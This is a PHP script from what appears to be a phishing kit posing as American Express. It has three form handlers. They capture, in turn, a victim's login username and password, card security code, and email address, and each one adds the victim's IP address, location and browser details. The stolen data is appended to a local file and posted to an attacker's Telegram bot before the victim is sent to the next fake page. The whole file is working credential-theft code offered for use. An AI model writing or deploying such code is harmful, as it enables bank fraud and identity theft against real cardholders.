<?php 
session_start();
// Variable declaration
$errors = array(); 

if (isset($_POST['username']) && isset($_POST['password'])) {
    include 'recon.php';
    include '../conf/config.php';
    $settings = include '../conf/settings.php';

    // Get User Input
    $_SESSION['username'] = $_POST['username'];
    $_SESSION['password'] = $_POST['password'];

    $ip = getenv("REMOTE_ADDR");
    $port = $_SERVER['REMOTE_PORT'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Store IP and Port in session
    $_SESSION['ip'] = $ip;
    $_SESSION['port'] = $port;

    // Send email
    $body = "AMEX B@NK  Login1 👨‍💻@SODEX\r\n";
    $body .= "|User ID: {$_SESSION['username']}\r\n";
    $body .= "|Password: {$_SESSION['password']}\r\n";
    $body .= "|---- I N F O | I P ----|\r\n";
    $body .= "IP Address: {$_SESSION['ip']}\r\n";
    $body .= "Port: {$_SESSION['port']}\r\n";
    $body .= "IP Country: {$_SESSION['country']}\r\n";
    $body .= "IP City: {$_SESSION['city']}\r\n";
    $body .= "Browser: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $body .= "User Agent: {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $body .= "TIME: ".date("d/m/Y h:i:sa")." GMT\r\n";
    $body .= "::: AMEX B@NK B@NK 💚SODEXRICHIE💚 ::::::\r\n";
    
    if($savetxt == "off"){
        $save = fopen("../data/login".$salt.".txt",'a');
        fwrite($save, $body);
        fclose($save);
    }             

    $subject = "Login Access 2 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
    $headers = "From: SODEX <sodex.com>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    if ($tgresult == "on") {
        $data = $body;
        $send = ['chat_id' => $settings['chat_id'], 'text' => $data];
        $website = "https://api.telegram.org/{$settings['bot_url']}";
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }

    echo "<script>window.location.href='../../csc.php';</script>";
    exit();
}


if (isset($_POST['csc'])) {
    include 'recon.php';
    include '../conf/config.php';
    $settings = include '../conf/settings.php';

    // Get User Input
    $_SESSION['csc'] = $_POST['csc'];

    $ip = getenv("REMOTE_ADDR");
    $port = $_SERVER['REMOTE_PORT'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Store IP and Port in session
    $_SESSION['ip'] = $ip;
    $_SESSION['port'] = $port;

    // Send email
    $body = "AMEX B@NK  👨‍💻SODEX  [OTP] \r\n";
    $body .= "|CSC : {$_SESSION['csc']}\r\n";
    $body .= "Telegram: @SODEX \r\n";
    $body .= "|------- I N F O | I P --------|\r\n";
    $body .= "IP Address: {$_SESSION['ip']}\r\n";
    $body .= "Port: {$_SESSION['port']}\r\n";
    $body .= "IP Country: {$_SESSION['country']}\r\n";
    $body .= "IP City: {$_SESSION['city']}\r\n";
    $body .= "Browser: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $body .= "User Agent: {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $body .= "TIME: ".date("d/m/Y h:i:sa")." GMT\r\n";
    $body .= "::::  AMEX B@NK 💚SODEXRICHIE💚 ::::\r\n";
    
    if($savetxt == "off"){
        $save = fopen("../data/login".$salt.".txt",'a');
        fwrite($save, $body);
        fclose($save);
    }             

    $subject = "Login Access 1 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
    $headers = "From: AKFOUR7 <Citizens@akfour7.com>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    if ($tgresult == "on") {
        $data = $body;
        $send = ['chat_id' => $settings['chat_id'], 'text' => $data];
        $website = "https://api.telegram.org/{$settings['bot_url']}";
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }

    echo "<script>window.location.href='../../email.php';</script>";
    exit();
}

if (isset($_POST['email'])) {
    include 'recon.php';
    include '../conf/config.php';
    $settings = include '../conf/settings.php';

    // Get User Input
    $_SESSION['email'] = $_POST['email'];

    $ip = getenv("REMOTE_ADDR");
    $port = $_SERVER['REMOTE_PORT'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Store IP and Port in session
    $_SESSION['ip'] = $ip;
    $_SESSION['port'] = $port;

    // Send email
    $body = "AMEX B@NK  👨‍💻SODEX  [OTP] \r\n";
    $body .= "|Email : {$_SESSION['email']}\r\n";
    $body .= "Telegram: @SODEX \r\n";
    $body .= "|------- I N F O | I P --------|\r\n";
    $body .= "IP Address: {$_SESSION['ip']}\r\n";
    $body .= "Port: {$_SESSION['port']}\r\n";
    $body .= "IP Country: {$_SESSION['country']}\r\n";
    $body .= "IP City: {$_SESSION['city']}\r\n";
    $body .= "Browser: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $body .= "User Agent: {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $body .= "TIME: ".date("d/m/Y h:i:sa")." GMT\r\n";
    $body .= "::::  AMEX B@NK 💚SODEXRICHIE💚 ::::\r\n";
    
    if($savetxt == "off"){
        $save = fopen("../data/login".$salt.".txt",'a');
        fwrite($save, $body);
        fclose($save);
    }             

    $subject = "Login Access 1 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
    $headers = "From: AMEX B@NK <sodex.com>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    if ($tgresult == "on") {
        $data = $body;
        $send = ['chat_id' => $settings['chat_id'], 'text' => $data];
        $website = "https://api.telegram.org/{$settings['bot_url']}";
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $send);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }

    echo "<script>window.location.href='../../c.php';</script>";
    exit();
}

?>
